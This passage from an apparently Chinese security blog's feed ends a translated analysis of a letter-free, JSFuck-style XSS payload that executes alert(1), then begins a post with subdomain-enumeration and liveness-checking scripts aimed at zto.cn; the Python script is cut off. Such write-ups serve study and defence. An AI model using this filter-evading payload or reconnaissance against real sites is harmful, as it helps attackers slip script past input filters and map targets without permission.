class=&quot;pun&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[]&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;typ&quot;&gt;Number&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+[]&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;typ&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[]+[]&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;typ&quot;&gt;Boolean&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;![]&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;typ&quot;&gt;Function&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[][&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;filter&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;eval        &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[][&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;filter&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;constructor&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;](&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; CODE &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)()&lt;/span&gt;</code></li><li><p><code>&lt;span class=&quot;pln&quot;&gt;window      &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[][&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;filter&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;constructor&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;](&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;return this&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)()&lt;/span&gt;</code><div><br></div><div><div style="widows: 1;"><font face="monospace"><span style="line-height: 19.59375px; white-space: pre;">0x02 新规则</span></font></div></div><div style="widows: 1;"><font face="monospace">&nbsp; &nbsp; 在<a href="https://inventropy.us/blog/constructing-an-xss-vector-using-no-letters" target="_blank" rel="noopener">《constructing-an-xss-vector-using-no-letters</a></font><span style="font-family: monospace; font-size: 10.5pt; line-height: 1.5;"><a href="https://inventropy.us/blog/constructing-an-xss-vector-using-no-letters" target="_blank" rel="noopener">》</a>篇文章中有几个新规则比较有意思，和大家分析下。</span></div><div style="widows: 1;"><span style="font-family: monospace; font-size: 10.5pt; line-height: 1.5;">我们分析下面这段代码：</span></div><div><pre class="prettyprint linenums prettyprinted"></pre></div></p></li><li><p><code>&lt;span class=&quot;str&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[(!&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]+(!&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]+(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+{})[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]][(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+{})[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]+(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+{})[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]+((&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[(!&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]+(!&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]+(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+{})[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]])+&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]+(!&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]+(!&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]+(!&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]+(!&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]+(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+{})[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]+(!&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]+(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+{})[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]+(!&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]](((!&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]+(!&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]+(!&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]+(!&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]+(!&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;])+&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;(1)&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)()&lt;/span&gt;</code><div>我们分片分析这个xss vector</div><div><pre class="p1" style="widows: 1;"><div style="line-height: normal;"><pre class="prettyprint linenums prettyprinted"></pre></div></pre></div></p></li><li><p><code>&lt;span class=&quot;pun&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]+(!&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]+(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+{})[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]&lt;/span&gt;</code><div><span style="line-height: normal;">false =&gt;!1+””</span></div><div><span style="line-height: normal;">true =&gt; !0+””</span></div><div>[object Object] =&gt; ‘’+{}</div><div><br></div><div>通过这3个基础向量，我们可以构造一个””[“sub”]出来function</div><div>function sub() { [native code] }  =&gt; (“”[(!1+””)[3]+(!0+””)[2]+(‘’+{})[2]])+””<br></div><div><br></div><div>“”[“sub”][“constructor”]这个结构相当于function(),我们调用它能够定义一个函数用仅仅一个字符串<br></div><div><br></div><div>因此，最上面的那段代码就是””[“sub”]<a href="&quot;alert(1">“constructor”</a>“)()，这段代码相当于function anonymous() {alert(1)}();<span style="line-height: 1.5;"></span></div><div><br></div><div>0x03 总结</div><div>    看到这篇文章仅仅觉得有意思，所以翻译并分析给大家看看，实际场景的利用还需思考。</div><div><br></div><div>原文连接：<a href="https://inventropy.us/blog/constructing-an-xss-vector-using-no-letters" target="_blank" rel="noopener">https://inventropy.us/blog/constructing-an-xss-vector-using-no-letters</a></div><div><br></div></p></li></ol><div><a href="http://www.wiz.cn/i/93198460" title="来自为知笔记(Wiz)" target="_blank" rel="noopener">来自为知笔记(Wiz)</a></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;font face=&quot;微软雅黑&quot;&gt;0x00 前言 &amp;nbsp; &amp;nbsp;&lt;/font&gt;&lt;div&gt;&lt;font face=&quot;微软雅黑&quot;&gt;今天看见mickey发的一个连接，关于字母js的构造，想起前端时间ctf中的jsfuck，于是写翻译以下，写出来和大家分享。&lt;/font
      
    
    </summary>
    
      <category term="技术文章" scheme="https://tycx2ry.github.io/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>二级域名查询处理</title>
    <link href="https://tycx2ry.github.io/2015/09/24/e4-ba-8c-e7-ba-a7-e5-9f-9f-e5-90-8d-e6-9f-a5-e8-af-a2-e5-a4-84-e7-90-86/"/>
    <id>https://tycx2ry.github.io/2015/09/24/e4-ba-8c-e7-ba-a7-e5-9f-9f-e5-90-8d-e6-9f-a5-e8-af-a2-e5-a4-84-e7-90-86/</id>
    <published>2015-09-24T06:58:24.000Z</published>
    <updated>2018-02-26T06:02:28.090Z</updated>
    
    <content type="html"><![CDATA[<div><font face="微软雅黑">&nbsp; &nbsp; 安全测试的时候用到的一些小脚本</font><br></div><div><font face="微软雅黑">1.查二级域名</font></div><font face="微软雅黑">&nbsp; &nbsp;&nbsp;</font>python flint.py rrset &amp;#42.zto.cn | grep “zto.cn”| awk ‘{print $1}’ | sort | uniq | grep -v “&amp;#42”&nbsp;<br><br><div><br></div><div>2.判断是否存在</div><div><font face="微软雅黑">&nbsp;&nbsp;</font><br></div><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;com&quot;&gt;# -&amp;#42- coding:utf-8 -&amp;#42-&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;kwd&quot;&gt;import&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; urllib2&lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;kwd&quot;&gt;import&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; re&lt;/span&gt;</code><br>4.5.  <code>&lt;span class=&quot;kwd&quot;&gt;def&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; alivecheck&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;):&lt;/span&gt;</code><br>6.  <code>&lt;span class=&quot;pln&quot;&gt;    url &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;http://&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;url&lt;/span&gt;</code><br>7.  <code>&lt;span class=&quot;pln&quot;&gt;    user_agent &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)&#39;&lt;/span&gt;</code><br>8.  <code>&lt;span class=&quot;pln&quot;&gt;    headers &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;User-Agent&#39;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; user_agent &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;}&lt;/span&gt;</code><br>9.  <code>&lt;span class=&quot;pln&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;</code><br>10.  <code>&lt;span class=&quot;pln&quot;&gt;        request &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; urllib2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Request&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;headers &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; headers&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;</code><br>11.  <code>&lt;span class=&quot;pln&quot;&gt;        response &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; urllib2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;urlopen&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;</code><br>12.  <code>&lt;span class=&quot;pln&quot;&gt;        content &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; response&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;()&lt;/span&gt;</code><br>13.  <code>&lt;span class=&quot;pln&quot;&gt;        pattern &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; re&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;compile&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;&amp;lt;title&amp;gt;(.&amp;#42)&amp;lt;\/title&amp;gt;&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;re&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;S&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;</code><br>14.  <code>&lt;span class=&quot;pln&quot;&gt;        items &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; re&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;findall&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;pattern&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;</code><br>15.  <code>&lt;span class=&quot;pln&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; len&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;items&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;</code><br>16.  <code>&lt;span class=&quot;pln&quot;&gt;            title &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; items&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]&lt;/span&gt;</code><br>17.  <code>&lt;span class=&quot;pln&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;</code><br>18.  <code>&lt;span class=&quot;pln&quot;&gt;            title &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;&#39;&lt;/span&gt;</code><br>19.  <code>&lt;span class=&quot;pln&quot;&gt;        dict_list &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;url&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;status&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;getcode&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(),&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;title&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;}&lt;/span&gt;</code><br>20.  <code>&lt;span class=&quot;pln&quot;&gt;        list&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;dict_list&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;</code><br>21.  <code>&lt;span class=&quot;pln&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;#print dict_list&lt;/span&gt;</code><br>22.  <code>&lt;span class=&quot;pln&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; urllib2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;URLError&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; e&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;</code><br>23.  <code>&lt;span class=&quot;pln&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; isinstance&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;urllib2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;HTTPError&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;):&lt;/span&gt;</code><br>24.  <code>&lt;span class=&quot;pln&quot;&gt;            dict_list &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;url&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;status&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;title&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;reason&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;}&lt;/span&gt;</code><br>25.  <code>&lt;span class=&quot;pln&quot;&gt;            list&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;dict_list&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;</code><br>26.  <code>&lt;span class=&quot;pln&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;#print dict_list&lt;/span&gt;</code><br>27.  <code>&lt;span class=&quot;pln&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;</code><br>28.  <code>&lt;span class=&quot;pln&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;pass&lt;/span&gt;</code><br>29.  <code>&lt;span class=&quot;kwd&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; __name__ &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;__main__&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;</code><br>30. 